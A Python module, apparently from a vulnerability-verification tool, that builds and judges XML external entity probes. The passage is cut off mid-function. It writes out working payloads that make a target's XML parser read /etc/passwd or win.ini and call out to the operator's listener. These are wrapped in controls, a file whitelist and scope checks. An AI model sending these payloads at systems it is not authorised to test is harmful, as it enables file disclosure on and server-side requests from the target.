"""verify-xxe 判定器（M25-a）：XML 外部实体的两条确定性通道。

## 这个类型要证明的是什么

XML 的 ``DOCTYPE`` 允许声明**外部实体**；解析器若开着外部实体，就会去加载它
指向的资源：

.. code-block:: xml

    <!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
    <r>&x;</r>

于是"解析一段 XML"变成两件**互不相同、但同样是二值**的观测：

============  ==================================  ==================
通道          观测                                结论
============  ==================================  ==================
内容事实      响应里出现指定 canary 文件的签名      confirmed(file)
回调事实      我们的 listener 收到带 token 的请求   confirmed(callback)
============  ==================================  ==================

回调通道与 SSRF 完全同构（同一套 ``CallbackListener`` + 唯一 token +
``hmac.compare_digest``），**不依赖目标上存在任何可读文件**；内容通道则依赖
"目标上恰好有那个 canary"——故两道阴性对照缺一不可（见下）。

## 为什么必须有「解析器还活着」的阳性对照

否则三态会塌成两态：响应里没有文件内容，分不清是

- ``rejected``——解析器**在工作**，只是关掉了外部实体（现代栈的默认行为）；还是
- ``blocked``——body 根本没被当 XML 解析（被 WAF 拦、端点不认这个 schema）。

故每个文件探针里同时放一个**内部实体** ``alive``，展开后得到
``PROOFHOUND-ALIVE``。响应里出现它 ⇒ **这段 XML 确实被解析了**。

**alive 的字面量在请求里写成字符引用** ``PROOFHOUND&#45;ALIVE``：实体值里的
字符引用由解析器在**声明时**就展开，所以真解析器展开 ``&alive;`` 后得到
``PROOFHOUND-ALIVE``；而把请求体**原样回显**的端点只会回显带 ``&#45;`` 的
字面量，**命中不了**这个标记。这是对"回显陷阱"的第二道结构性防线（第一道是
"出现 ``/etc/passwd`` 字样 ≠ 读到文件内容"）。

## 判定分界（宁漏勿滥；顺序即优先级）

================================================================  ==========
条件                                                              结论
================================================================  ==========
file 命中 ∧ 基线未命中 ∧ 阴性对照未命中 ∧ alive 被替换             confirmed(file)
回调命中 ∧ callback-control 未命中                                confirmed(callback)
listener 不可用                                                    blocked
有探针请求失败 / 未被当 XML 处理（无 SOAP Fault）                   blocked
callback-control 命中（非实体路径也触发了回调）                     blocked
基线或阴性对照命中 canary（内容不可归因）                           blocked
alive 未被替换（解析器不工作 / body 没被当 XML）                    blocked
  但响应里出现**未展开的** alive 字面量（原样回显）                  rejected
以上都不成立（解析器工作、外部实体不解析、listener 静默）            rejected
================================================================  ==========

> 回显陷阱那一行是本实现相对交接单 §4.2 的**收紧**：原表把"回显端点"也归
> ``rejected``（因为裸 alive 字面量被回显，看起来像"被解析了"）。本实现把
> alive 写成字符引用，于是"响应里出现字面量"本身就是**原样回显的指纹**：
> 它证明端点没解析这段 XML，因此"外部实体未解析"这个结论仍成立（``rejected``），
> 但理由从"解析器工作但关了外部实体"改成"请求体被原样回显、解析器根本没介入"。
> 这样既不误确认（签名不在请求体里），也不再让回显端点冒充"解析过"。

> **SOAP Fault 不等于 blocked**：很多真实端点的文件内容出现在
> ``500 + <faultstring>`` 里，只要签名命中就是 confirmed。

## 安全边界（写死，不可配置）

- **canary 白名单**只有两个：Linux ``/etc/passwd``（签名 ``root:x:0:0``）与
  Windows ``C:\\Windows\\win.ini``（签名 ``[fonts]``）。自动通道
  :func:`file_body` **只接受**这两个目标，构造其它路径直接抛
  :class:`XxeFileTargetError`——本工具**不是**任意文件读取器；
- 操作员自带的 ``--body-template`` 里出现的**每个** ``file://`` 路径都要进审计；
  白名单外的路径**默认拒绝**，只有显式 ``--allow-file`` 才放行（记
  ``xxe_file_override``）。**模型永远不能指定路径**；
- **不发实体膨胀**（billion laughs / 递归实体）：每个 body 最多一条**外部**
  实体定义、实体值里不含 ``&``、同一实体只引用一次——DoS 不是本类型；
- 不做协议链（``expect://`` / ``data://`` / ``phar://`` / ``gopher://``）、
  不做远程 DTD（盲 XXE）、不做任何写操作、不做绕过变体（编码/``....//``）；
- 只发 POST；每个 URL 发请求**前**必过 ``check_scope``（红线 5）。

边界与代价见 AGENTS.md 限制 74。
"""

from __future__ import annotations

import os
import re
import secrets
import sys
from dataclasses import dataclass, field
from hashlib import sha256

from proofhound.verify.ssrf import TOKEN_PREFIX as SSRF_TOKEN_PREFIX
from proofhound.verify.ssrf import new_token

#: 两条确认手段的 method 白名单值（M25-b 登记时用；M25-a 只定义不登记）。
XXE_FILE_METHOD = "xml-entity-file-confirmed"
XXE_CALLBACK_METHOD = "xml-entity-callback-confirmed"

#: 具名证据标签（同 ``unauth-response-equivalence`` / ``template-evaluation``
#: / ``error-trace`` 的先例）：让"这条 Confirmed 靠 XXE"在证据层可分辨。
XXE_EVIDENCE_KIND = "xml-entity-resolution"

#: 阳性对照展开后的标记（**请求体里不出现这个字面量**，见模块 docstring）。
ALIVE_MARKER = "PROOFHOUND-ALIVE"

#: 阳性对照在请求体里的字面形态（``&#45;`` 是 ``-`` 的字符引用）。
ALIVE_LITERAL = "PROOFHOUND&#45;ALIVE"

#: 内部实体名。
ALIVE_ENTITY = "alive"

#: 外部实体名。
SYSTEM_ENTITY = "x"

#: token 前缀（与 SSRF 的 ``phssrf_``、cmdi 的 ``phcmdi_`` 区分，便于日志分辨）。
TOKEN_PREFIX = "phxxe_"

#: 缺省请求体类型。
DEFAULT_CONTENT_TYPE = "application/xml"

#: 缺省单请求超时（秒）。
DEFAULT_TIMEOUT = 10.0

#: 响应正文保留上限（与 ``verify/http_body.py`` 同值）。
MAX_RESPONSE_BYTES = 256 * 1024

#: 每端点请求上限（交接单 §4.3）：baseline / file / file-negative / callback。
MAX_REQUESTS_PER_ENDPOINT = 4

#: 回调探针发出后等待目标发起的回调的宽限（秒）。
CALLBACK_WAIT_SECONDS = 3.0

#: 网关状态码：**且**正文不像 SOAP Fault 时判"未被当 XML 处理"。
GATEWAY_STATUSES = frozenset({502, 503, 504})

#: SOAP Fault 的形状（只要出现 <Fault / <faultstring / <faultcode / <detail>）。
SOAP_FAULT_RE = re.compile(
    rb"<(?:\w+:)?(?:Fault|faultstring|faultcode|detail)\b", re.IGNORECASE
)

#: ``file://`` URL 的抽取（到空白/引号/尖括号/右括号为止）。
FILE_URL_RE = re.compile(r"file://[^\s\"'<>)]+", re.IGNORECASE)

#: DOCTYPE 内部子集（``<!DOCTYPE r [ ... ]>``）。
_DOCTYPE_INTERNAL_RE = re.compile(r"<!DOCTYPE\b[^\[]*\[.*?\]\s*>", re.DOTALL)

#: 无内部子集的 DOCTYPE。
_DOCTYPE_SIMPLE_RE = re.compile(r"<!DOCTYPE\b[^>\[]*>", re.DOTALL)

#: 实体声明里的名字（``<!ENTITY name SYSTEM "..."`` / ``<!ENTITY name "v"``）。
ENTITY_NAME_RE = re.compile(r"<!ENTITY\s+([A-Za-z_][\w.-]*)\s")

#: 外部实体声明的条数（DoS 防线的断言口径）。
_SYSTEM_DECL_RE = re.compile(
    r"<!ENTITY\s+[A-Za-z_][\w.-]*\s+SYSTEM\s", re.IGNORECASE
)

#: 实体声明里的值（用于"实体值不得互相引用"的断言）。
_ENTITY_VALUE_RE = re.compile(
    r"<!ENTITY\s+(?P<name>[A-Za-z_][\w.-]*)\s+(?P<kind>SYSTEM\s+\"[^\"]*\"|\"[^\"]*\")",
    re.IGNORECASE,
)

#: 字符引用与预定义实体（它们**不是**实体间引用，检查前先剔除）。
_CHAR_REF_RE = re.compile(
    r"&#\d+;|&#x[0-9A-Fa-f]+;|&(?:amp|lt|gt|quot|apos);"
)


class XxeError(ValueError):
    """XXE 探针的构造/入口错误（CLI 据此返回退出码 2）。"""


class XxeFileTargetError(XxeError):
    """``file://`` 目标不在 canary 白名单里（**默认拒绝**）。"""


# =====================================================================
# canary（写死的文件白名单）
# =====================================================================


@dataclass(frozen=True)
class Canary:
    """一个 canary 文件：``file://`` URL + 路径 + 内容签名。"""

    label: str
    url: str
    path: str
    signature: str


#: Linux canary：``root:x:0:0`` 是 ``/etc/passwd`` 的第一行前缀。
CANARY_LINUX = Canary(
    label="linux",
    url="file:///etc/passwd",
    path="/etc/passwd",
    signature="root:x:0:0",
)

#: Windows canary：``win.ini`` 的 ``[fonts]`` 段。
CANARY_WINDOWS = Canary(
    label="windows",
    url="file:///C:/Windows/win.ini",
    path="C:\\Windows\\win.ini",
    signature="[fonts]",
)

#: 全部 canary（**这张表就是白名单**，没有第二个真相源）。
CANARIES: tuple[Canary, ...] = (CANARY_LINUX, CANARY_WINDOWS)


def normalize_file_target(value: str) -> str:
    """把 ``file://`` URL 或路径归一成可比较的键（确定性、无网络）。

    - ``file:///etc/passwd`` → ``/etc/passwd``
    - ``file:///C:/Windows/win.ini`` → ``c:/windows/win.ini``（Windows 大小写不敏感）

    归一化只服务于**白名单比较**，不参与请求体构造（请求体用原始 URL）。
    """
    raw = value.strip()
    if raw[:7].lower() == "file://":
        raw = raw[7:]
    raw = raw.replace("\\", "/")
    # ``file:///x`` 剥掉 scheme 后是 ``/x``；``file:////x`` 这类非常规写法收敛成 ``/x``。
    while raw.startswith("//"):
        raw = raw[1:]
    match = re.fullmatch(r"/?([A-Za-z]):/(.*)", raw)
    if match:
        return f"{match.group(1).lower()}:/{match.group(2).lower()}"
    return raw


#: 白名单的归一化键集（由 :data:`CANARIES` 派生，不手写第二遍）。
CANARY_WHITELIST: frozenset[str] = frozenset(
    normalize_file_target(canary.url) for canary in CANARIES
)


def default_canary() -> Canary:
    """按**工具所在平台**选 canary（Windows → win.ini，其余 → /etc/passwd）。

    这是保守的缺省：工具与靶同机时必然有效；跨平台目标请自带
    ``--body-template``（否则"目标上没有这个文件"会被读成"外部实体已关闭"，
    见 AGENTS.md 限制 74）。
    """
    return CANARY_WINDOWS if os.name == "nt" else CANARY_LINUX


def canary_for(label: str) -> Canary:
    """按 label（``linux`` / ``windows``）取 canary；未知 label 抛错。"""
    for canary in CANARIES:
        if canary.label == label:
            return canary
    raise XxeError(
        f"未知 canary {label!r}（可选：{', '.join(c.label for c in CANARIES)}）"
    )


def file_urls_in(text: str) -> tuple[str, ...]:
    """抽出一段文本里出现的全部 ``file://`` URL（保序去重）。"""
    seen: list[str] = []
    for match in FILE_URL_RE.finditer(text):
        url = match.group(0)
        if url not in seen:
            seen.append(url)
    return tuple(seen)


@dataclass(frozen=True)
class FileTargetScan:
    """一段模板里 ``file://`` 目标的审计结果（白名单裁决）。"""

    urls: tuple[str, ...]
    normalized: tuple[str, ...]
    allowed: tuple[str, ...]
    rejected: tuple[str, ...]
    overrides: tuple[str, ...]

    @property
    def ok(self) -> bool:
        return not self.rejected

    def to_dict(self) -> dict:
        return {
            "urls": list(self.urls),
            "normalized": list(self.normalized),
            "allowed": list(self.allowed),
            "rejected": list(self.rejected),
            "overrides": list(self.overrides),
        }


def scan_file_targets(text: str, *, allow: tuple[str, ...] = ()) -> FileTargetScan:
    """把模板里的 ``file://`` 目标逐个对白名单裁决（**默认拒绝**）。

    ``allow`` 是操作员显式给的 ``--allow-file`` 路径；命中它记 ``overrides``
    （审计里写作 ``xxe_file_override``），否则进 ``rejected``。
    """
    allowed_extra = {normalize_file_target(item) for item in allow if item.strip()}
    urls = file_urls_in(text)
    normalized: list[str] = []
    allowed: list[str] = []
    rejected: list[str] = []
    overrides: list[str] = []
    for url in urls:
        key = normalize_file_target(url)
        normalized.append(key)
        if key in CANARY_WHITELIST:
            allowed.append(url)
        elif key in allowed_extra:
            overrides.append(url)
        else:
            rejected.append(url)
    return FileTargetScan(
        urls=urls,
        normalized=tuple(normalized),
        allowed=tuple(allowed),
        rejected=tuple(rejected),
        overrides=tuple(overrides),
    )


def require_whitelisted(url: str) -> Canary:
    """断言 ``url`` 就是某个白名单 canary（自动通道的唯一入口）。"""
    key = normalize_file_target(url)
    for canary in CANARIES:
        if normalize_file_target(canary.url) == key:
            return canary
    raise XxeFileTargetError(
        f"拒绝构造外部实体：{url!r} 不在 canary 白名单里"
        f"（只允许 {', '.join(c.url for c in CANARIES)}）"
    )


# =====================================================================
# 请求体模板（全部无害：无膨胀、无协议链、无写操作）
# =====================================================================


def _xml_escape(value: str) -> str:
    """最小 XML 转义（文本节点与属性值通用）。"""
    return (
        value.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


def _envelope(doctype: str, inner: str) -> str:
    """统一外框：SOAP 信封 + 一个业务元素 ``r``。"""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f"{doctype}"
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
        "  <soap:Body>\n"
        f'    <r xmlns="urn:proofhound:xxe">{inner}</r>\n'
        "  </soap:Body>\n"
        "</soap:Envelope>\n"
    )


def _system_doctype(system_url: str, *, alive: bool) -> str:
    """构造带外部实体的 DOCTYPE 声明块（**唯一**允许出现 SYSTEM 的地方）。"""
    lines = ["<!DOCTYPE soap:Envelope [\n"]
    if alive:
        lines.append(f'  <!ENTITY {ALIVE_ENTITY} "{ALIVE_LITERAL}">\n')
    lines.append(f'  <!ENTITY {SYSTEM_ENTITY} SYSTEM "{_xml_escape(system_url)}">\n')
    lines.append("]>\n")
    return "".join(lines)


def baseline_body(*, callback_url: str | None = None) -> bytes:
    """基线体：**无 DOCTYPE、无实体**，参数值正常。

    可选携带回调 URL **字面量**：这一个体同时充当交接单 §4.1 的
    ``callback-control``（同 URL、无 DOCTYPE）——若目标/中间层会对着请求体里
    的任意 URL 发请求，它就会在这里命中，于是回调事实不可归因（判 blocked）。
    """
    parts = ["<probe>baseline</probe><value>1</value>"]
    if callback_url:
        parts.append(f"<callback>{_xml_escape(callback_url)}</callback>")
    return _envelope("", "".join(parts)).encode("utf-8")


def callback_control_body(*, callback_url: str) -> bytes:
    """``callback-control`` 模板（与 :func:`baseline_body` 同体，语义独立命名）。"""
    return baseline_body(callback_url=callback_url)


def file_body(canary: Canary | str, *, alive: bool = True) -> bytes:
    """内容通道探针：外部实体读 canary 文件（**只接受白名单 canary**）。

    ``alive=True`` 时同一体里放内部实体 ``&alive;``（阳性对照）。外部实体
    定义恒为 1 条、内部实体值不含 ``&``、实体只被引用一次——**不发实体膨胀**。
    """
    url = canary.url if isinstance(canary, Canary) else canary
    require_whitelisted(url)
    doctype = _system_doctype(url, alive=alive)
    inner = f"<probe>file</probe><value>&{SYSTEM_ENTITY};</value>"
    if alive:
        inner += f"<ctrl>&{ALIVE_ENTITY};</ctrl>"
    return _envelope(doctype, inner).encode("utf-8")


def negative_body(file_url: str, *, alive: bool = True) -> bytes:
    """阴性对照：同结构，但外部实体指向**不存在的文件**。

    它的作用是证明"响应里没出现 canary 签名"不是因为我们读错了路径/被缓存——
    如果连不存在的文件都能读出签名，那签名一定来自别处（基线污染）。
    """
    doctype = _system_doctype(file_url, alive=alive)
    inner = f"<probe>file-negative</probe><value>&{SYSTEM_ENTITY};</value>"
    if alive:
        inner += f"<ctrl>&{ALIVE_ENTITY};</ctrl>"
    return _envelope(doctype, inner).encode("utf-8")


def callback_body(*, callback_url: str) -> bytes:
    """回调通道探针：外部实体指向我们的 listener（带唯一 token）。"""
    if not callback_url.startswith(("http://", "https://")):
        raise XxeError(f"回调地址必须是 http(s)：{callback_url!r}")
    doctype = _system_doctype(callback_url, alive=False)
    return _envelope(doctype, f"<probe>callback</probe><value>&{SYSTEM_ENTITY};</value>").encode(
        "utf-8"
    )


def alive_body() -> bytes:
    """只有内部实体的阳性对照体（单测/演示用；不进探针计划）。"""
    doctype = f'<!DOCTYPE soap:Envelope [\n  <!ENTITY {ALIVE_ENTITY} "{ALIVE_LITERAL}">\n]>\n'
    return _envelope(doctype, f"<probe>alive</probe><ctrl>&{ALIVE_ENTITY};</ctrl>").encode(
        "utf-8"
    )


def nonexistent_file_url() -> str:
    """构造一个**必然不存在**的文件 URL（8 位随机，避免命中真实文件）。"""
    return f"file:///nonexistent_{secrets.token_hex(4)}"


def new_xxe_token() -> str:
    """本类型专属前缀的探针 token（128 位随机，不可猜）。"""
    return TOKEN_PREFIX + new_token().removeprefix(SSRF_TOKEN_PREFIX)


# =====================================================================
# 探针计划
# =====================================================================


@dataclass(frozen=True)
class ProbeSpec:
    """计划里的一步：模板名 + 在判定里的角色 + 完整 body。"""

    name: str
    role: str
    body: bytes

    @property
    def sha256(self) -> str:
        return sha256(self.body).hexdigest()


#: 角色常量（判定层按角色取观测，不按名字字符串硬编码）。
ROLE_BASELINE = "baseline"
ROLE_FILE = "file"
ROLE_NEGATIVE = "negative"
ROLE_CALLBACK = "callback"

PROBE_BASELINE = "baseline"
PROBE_FILE = "file"
PROBE_NEGATIVE = "file-negative"
PROBE_CALLBACK = "callback"


def probe_plan(
    *,
    canary: Canary,
    callback_url: str,
    control_url: str,
    nonexistent_url: str | None = None,
) -> tuple[ProbeSpec, ...]:
    """构造本端点的 4 步探针计划（**顺序即发送顺序**，≤ :data:`MAX_REQUESTS_PER_ENDPOINT`）。

    ==============  ==========================================  ==================
    步骤             body                                        作用
    ==============  ==========================================  ==================
    baseline        无 DOCTYPE，携带 **control** 回调 URL 字面量  基线 + 回调对照
    file            alive + 外部实体读 canary                    内容通道 + 阳性对照
    file-negative   alive + 外部实体读不存在的文件                 阴性对照
    callback        外部实体指向 **probe** 回调 URL               回调通道
    ==============  ==========================================  ==================

    两组回调 URL 用**各自的 token**：baseline 用 control token、callback 用
    probe token。同一个 token 无法区分"基线触发的迟到回调"与"实体触发的回调"，
    而"每探针唯一 token"本来就是本仓库的既有纪律（``verify/ssrf.py``）。
    """
    return (
        ProbeSpec(PROBE_BASELINE, ROLE_BASELINE, baseline_body(callback_url=control_url)),
        ProbeSpec(PROBE_FILE, ROLE_FILE, file_body(canary, alive=True)),
        ProbeSpec(
            PROBE_NEGATIVE,
            ROLE_NEGATIVE,
            negative_body(nonexistent_url or nonexistent_file_url(), alive=True),
        ),
        ProbeSpec(PROBE_CALLBACK, ROLE_CALLBACK, callback_body(callback_url=callback_url)),
    )


# =====================================================================
# 观测 → 事实
# =====================================================================


@dataclass(frozen=True)
class ProbeObservation:
    """一次探针的结构化观测（正文只用于**签名搜索**，不落盘、不进 prompt）。"""

    name: str
    status: int | None
    error: str | None
    body: bytes
    url: str = ""

    def canary_seen(self, signature: str) -> bool:
        """响应里是否出现 canary 签名（**字节级**搜索，大小写敏感）。"""
        if not signature:
            return False
        return signature.encode("utf-8") in self.body

    @property
    def alive_seen(self) -> bool:
        """响应里是否出现阳性对照标记（``PROOFHOUND-ALIVE``）。"""
        return ALIVE_MARKER.encode("utf-8") in self.body

    @property
    def alive_literal_echoed(self) -> bool:
        """响应里是否出现**未展开**的字面量（原样回显的指纹）。"""
        return ALIVE_LITERAL.encode("utf-8") in self.body

    @property
    def answered(self) -> bool:
        return is_answered(self.status, self.error, self.body)

    def to_dict(self) -> dict:
        """**不含正文**的摘要（可进证据 JSON）。"""
        return {
            "probe": self.name,
            "status": self.status,
            "error": self.error,
            "bytes": len(self.body),
            "sha256": sha256(self.body).hexdigest() if self.body else "",
        }


def looks_like_soap_fault(body: bytes) -> bool:
    """正文是否具有 SOAP Fault 的形状（``<Fault`` / ``<faultstring`` 等）。"""
    return SOAP_FAULT_RE.search(body or b"") is not None


def is_answered(status: int | None, error: str | None, body: bytes) -> bool:
    """这次探针是否"被响应了"（判定 rejected 的必要条件）。

    否定条件只有两种：**没有响应**（error / 无状态码），或**网关代答**
    （502/503/504 且正文不像 SOAP Fault）。其余状态码（含 500 + fault）都算
    被响应——500 不等于 blocked（交接单 §4.2 的注）。
    """
    if error is not None or status is None:
        return False
    if status in GATEWAY_STATUSES and not looks_like_soap_fault(body):
        return False
    return True


# =====================================================================
# 判定
# =====================================================================


@dataclass
class XxeJudgment:
    """三态结论 + 两条通道各自的事实 + 全部否定项。"""

    verdict: str
    channels: tuple[str, ...] = ()
    reasons: list[str] = field(default_factory=list)
    facts: dict = field(default_factory=dict)

    @property
    def confirmed(self) -> bool:
        return self.verdict == "confirmed"

    def to_dict(self) -> dict:
        return {
            "verdict": self.verdict,
            "channels": list(self.channels),
            "reasons": list(self.reasons),
            "facts": dict(self.facts),
        }


def judge(
    *,
    canary: Canary,
    baseline: ProbeObservation,
    file_probe: ProbeObservation,
    negative: ProbeObservation,
    callback: ProbeObservation,
    callback_hit: bool,
    control_hit: bool,
    listener_error: bool = False,
    callback_host_port: str = "",
    alive_evidence_sound: bool = True,
    canary_available: bool = True,
) -> XxeJudgment:
    """纯判定函数：把 4 次观测 + 2 个回调事实映射成三态（见模块 docstring 的表）。

    ``alive_evidence_sound=False`` 表示操作员模板里出现了**字面量**
    ``PROOFHOUND-ALIVE``（而不是字符引用形态）——那时"响应里有 alive"也可以由
    原样回显解释，阳性对照失效 ⇒ 不允许给 rejected（保守方向）。

    ``canary_available=False`` 表示操作员模板只读了白名单外的路径（``--allow-file``
    放行），此时**没有已知签名可判**：内容通道零覆盖，只能靠回调通道确认；
    不允许据此给 rejected。
    """
    baseline_canary_hit = baseline.canary_seen(canary.signature)
    file_canary_hit = file_probe.canary_seen(canary.signature)
    negative_canary_hit = negative.canary_seen(canary.signature)
    alive_replaced = file_probe.alive_seen

    observations = (baseline, file_probe, negative, callback)
    errored = [o.name for o in observations if o.error]
    unanswered = [o.name for o in observations if o.error is None and not o.answered]
    all_answered = not errored and not unanswered

    facts = {
        "baseline_canary_hit": baseline_canary_hit,
        "file_canary_hit": file_canary_hit,
        "negative_canary_hit": negative_canary_hit,
        "alive_replaced": alive_replaced,
        "alive_literal_echoed": file_probe.alive_literal_echoed,
        "alive_evidence_sound": alive_evidence_sound,
        "callback_hit": callback_hit,
        "callback_control_hit": control_hit,
        "listener_unavailable": listener_error,
        "all_probes_answered": all_answered,
        "errored_probes": list(errored),
        "unanswered_probes": list(unanswered),
        "canary_label": canary.label,
        "canary_path": canary.path,
        "canary_signature": canary.signature,
        "canary_available": canary_available,
        "callback_listener": callback_host_port,
        "requested_probes": len(observations),
    }

    file_confirmed = (
        canary_available
        and file_canary_hit
        and not baseline_canary_hit
        and not negative_canary_hit
        and alive_replaced
    )
    callback_confirmed = callback_hit and not control_hit

    # 1) 有通道确认 ⇒ confirmed（证据是二值事实，其余探针的瑕疵不推翻它）
    if file_confirmed or callback_confirmed:
        channels: list[str] = []
        reasons: list[str] = []
        if file_confirmed:
            channels.append("file")
            reasons.append(
                f"响应里出现 canary 文件的签名（{canary.path}），"
                "且基线体与阴性对照都不含该签名 ⇒ 外部实体被解析并读取了文件"
            )
        if callback_confirmed:
            channels.append("callback")
            reasons.append(
                "回调 listener 收到含本次探针唯一 token 的请求 ⇒ 外部实体被解析"
                "并向我们指定的地址发起了请求（二值事实）"
            )
        if alive_replaced:
            reasons.append("阳性对照成立：内部实体被展开为 PROOFHOUND-ALIVE")
        return XxeJudgment(
            verdict="confirmed", channels=tuple(channels), reasons=reasons, facts=facts
        )

    # 2) 回调通道不可用 ⇒ 覆盖不全
    if listener_error:
        return XxeJudgment(
            verdict="blocked",
            reasons=["回调 listener 不可用 ⇒ 回调通道零覆盖（不驳回）"],
            facts=facts,
        )

    # 3) 探针失败 / 网关代答 ⇒ 覆盖不全
    if errored:
        detail = "；".join(
            f"{o.name}: {o.error}" for o in observations if o.name in errored
        )
        return XxeJudgment(
            verdict="blocked",
            reasons=[f"探针请求失败（覆盖不全，不驳回）：{detail}"],
            facts=facts,
        )
    if unanswered:
        return XxeJudgment(
            verdict="blocked",
            reasons=[
                f"探针未被当 XML 处理（{', '.join(unanswered)}：非 2xx 且无 SOAP Fault"
                " 内容，疑似网关/WAF 代答）⇒ 无法区分『外部实体关了』与『body 根本没"
                "被解析』（覆盖不全，不驳回）"
            ],
            facts=facts,
        )

    # 4) 对照失效 ⇒ 观测不可归因
    if control_hit:
        return XxeJudgment(
            verdict="blocked",
            reasons=[
                "callback-control 命中：无 DOCTYPE 的基线体携带的对照 URL 也触发了回调"
                " ⇒ 目标/中间层会对着请求体里的任意 URL 发请求，回调事实不可归因于"
                "『外部实体被解析』（覆盖不全，不驳回）"
            ],
            facts=facts,
        )

    # 5) 没有可判的 canary（模板只读白名单外路径）⇒ 内容通道零覆盖
    if not canary_available:
        return XxeJudgment(
            verdict="blocked",
            reasons=[
                "本次模板只读了 canary 白名单之外的路径（由 --allow-file 放行）"
                " ⇒ 没有已知签名可判，内容通道零覆盖；本运行只能靠回调通道确认"
                "（覆盖不全，不驳回）"
            ],
            facts=facts,
        )

    # 6) 基线/阴性对照里出现 canary 签名 ⇒ 内容事实不可归因
    if baseline_canary_hit or negative_canary_hit:
        polluted = []
        if baseline_canary_hit:
            polluted.append("基线体")
        if negative_canary_hit:
            polluted.append("阴性对照（不存在的文件）")
        return XxeJudgment(
            verdict="blocked",
            reasons=[
                f"{'与'.join(polluted)}的响应里也出现了 canary 文件的签名"
                " ⇒ 该签名在目标上本来就存在，内容事实不可归因（覆盖不全，不驳回）"
            ],
            facts=facts,
        )

    # 7) 阳性对照失效 ⇒ 解析器没在工作，或 body 没被当 XML 解析
    if not alive_evidence_sound:
        return XxeJudgment(
            verdict="blocked",
            reasons=[
                "请求体里出现了裸 alive 字样（非字符引用形态）⇒ 『响应里有 alive』"
                "可以由原样回显解释，阳性对照失效（覆盖不全，不驳回）"
            ],
            facts=facts,
        )
    if not alive_replaced:
        if file_probe.alive_literal_echoed:
            return XxeJudgment(
                verdict="rejected",
                reasons=[
                    "响应是**请求体原样回显**：未展开的 alive 字面量"
                    f"（{ALIVE_LITERAL}）原封不动出现在响应里 ⇒ 该端点没有解析这段"
                    " XML，因此也没有解析外部实体",
                    "回显陷阱：响应里出现 `file:///etc/passwd` 这类路径字样"
                    "**不是**证据——canary 签名（文件内容）没有出现，回调 listener 也"
                    "没有收到请求",
                    "结论边界：只说明该端点是回显/透传形态，不等于『没有 XXE 风险』",
                ],
                facts=facts,
            )
        return XxeJudgment(
            verdict="blocked",
            reasons=[
                "阳性对照未被替换：响应里找不到 PROOFHOUND-ALIVE ⇒ 这段 XML 没有被"
                "当 XML 解析（端点不认这个 schema / 被 WAF 拦掉），无法据此判"
                "『外部实体已关闭』（覆盖不全，不驳回）"
            ],
            facts=facts,
        )

    # 8) 解析器工作、外部实体不解析、listener 静默 ⇒ 真阴性
    return XxeJudgment(
        verdict="rejected",
        reasons=[
            "阳性对照成立（这段 XML 被解析了），但外部实体未被解析："
            f"读 {canary.path} 没有读到任何内容，回调 listener 也没有收到请求",
            "两道阴性对照均正常：不存在的文件没有产出签名，基线体也没有触发回调",
            "结论边界：该端点**当前**不解析外部实体 / 不接受这段 XML；"
            "不等于『没有 XXE 风险』（解析器配置可能随版本变化）",
        ],
        facts=facts,
    )


# =====================================================================
# 操作员模板（--body-template）
# =====================================================================


@dataclass(frozen=True)
class TemplateProbes:
    """由操作员模板派生出的 4 个探针（保持信封结构，只换实体目标）。"""

    file: bytes
    negative: bytes
    callback: bytes
    baseline: bytes
    file_urls: tuple[str, ...]
    replaced: tuple[str, ...]
    alive_declared: bool
    alive_literal_present: bool
    entity_names: tuple[str, ...]

    def to_dict(self) -> dict:
        return {
            "file_urls": list(self.file_urls),
            "replaced": list(self.replaced),
            "alive_declared": self.alive_declared,
            "alive_literal_present": self.alive_literal_present,
            "entity_names": list(self.entity_names),
        }


def strip_doctype(text: str) -> str:
    """去掉 DOCTYPE（含内部子集）——基线体不能带任何实体声明。"""
    return _DOCTYPE_SIMPLE_RE.sub("", _DOCTYPE_INTERNAL_RE.sub("", text))


def entity_names(text: str) -> tuple[str, ...]:
    """模板里声明过的实体名（保序去重）。"""
    seen: list[str] = []
    for match in ENTITY_NAME_RE.finditer(text):
        name = match.group(1)
        if name not in seen:
            seen.append(name)
    return tuple(seen)


def derive_template_probes(
    text: str,
    *,
    callback_url: str,
    nonexistent_url: str | None = None,
) -> TemplateProbes:
    """把操作员模板派生成 4 个探针。

    规则（确定性、可解释）：

    - ``file`` = 模板原样；
    - ``negative`` = 把每个 ``file://`` URL 换成**不存在的文件**；
    - ``callback`` = 把每个 ``file://`` URL 换成我们的回调 URL；
    - ``baseline`` = 去掉 DOCTYPE，并把原实体引用换成中性字面量 ``baseline``。

    模板必须至少含一个 ``file://`` 或一段 DOCTYPE，否则派生不出对照（抛
    :class:`XxeError`，CLI 返回退出码 2）。白名单裁决由调用方先用
    :func:`scan_file_targets` 完成。
    """
    urls = file_urls_in(text)
    names = entity_names(text)
    if not urls and not names:
        raise XxeError(
            "body 模板里既没有 file:// 目标、也没有实体声明（DOCTYPE）——"
            "派生不出基线与阴性对照"
        )
    replacement_negative = nonexistent_url or nonexistent_file_url()
    negative = text
    callback = text
    for url in urls:
        negative = negative.replace(url, replacement_negative)
        callback = callback.replace(url, callback_url)
    baseline = strip_doctype(text)
    for name in names:
        baseline = baseline.replace(f"&{name};", "baseline")
    return TemplateProbes(
        file=text.encode("utf-8"),
        negative=negative.encode("utf-8"),
        callback=callback.encode("utf-8"),
        baseline=baseline.encode("utf-8"),
        file_urls=urls,
        replaced=urls,
        alive_declared=(ALIVE_LITERAL in text or ALIVE_MARKER in text),
        alive_literal_present=ALIVE_MARKER in text,
        entity_names=names,
    )


def entity_amplification_reasons(body: bytes) -> tuple[str, ...]:
    """实体膨胀的**结构性**检查（空元组 = 通过）。

    口径（见 AGENTS.md 限制 74 的披露）：① 每个 body 的**外部**实体定义 ≤1；
    ② 实体值里不含 ``&``（无实体间引用 ⇒ 无递归）；③ 同一实体引用不超过 1 次
    （``&x;&x;&x;...`` 的膨胀形态）。内部 ``alive`` 对照是无害的常量实体，
    不计入"外部实体"上限。
    """
    text = body.decode("utf-8", "replace")
    reasons: list[str] = []
    external = _SYSTEM_DECL_RE.findall(text)
    if len(external) > 1:
        reasons.append(f"外部实体定义 {len(external)} 条（上限 1）")
    for match in _ENTITY_VALUE_RE.finditer(text):
        kind = match.group("kind")
        if kind.upper().startswith("SYSTEM"):
            continue
